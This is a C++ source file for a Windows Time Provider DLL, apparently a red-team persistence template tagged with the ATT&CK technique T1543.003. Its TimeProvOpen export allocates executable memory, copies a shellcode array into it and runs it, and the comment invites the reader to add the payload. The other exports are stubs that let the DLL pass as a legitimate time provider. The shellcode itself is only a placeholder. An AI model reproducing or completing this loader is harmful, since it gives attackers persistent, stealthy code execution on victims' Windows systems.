/*
 * TimeProvider Persistence DLL (T1543.003)
 * Entry point: TimeProvOpen() - add payload code here
 */
#include <Windows.h>

extern "C" {
    __declspec(dllexport) DWORD WINAPI TimeProvOpen(
        PWSTR pwszNamingSystem,
        PWSTR pwszDllName,
        void* ptpPI
    ) {
        unsigned char shellcode[] = {"0%"};
        void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcode, sizeof(shellcode));
        ((void(*)())exec)();
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvClose() {
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvGetSamples(
        void* ptpSamples,
        PULONG pnSamples
    ) {
        return ERROR_SUCCESS;
    }

    __declspec(dllexport) DWORD WINAPI TimeProvSetConfig(
        DWORD dwOperation,
        DWORD dwProviderIndex,
        ULONG ulRole,
        ULONG ulAllowable
    ) {
        return ERROR_SUCCESS;
    }
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case 1:
        break;
    }
    return TRUE;
}
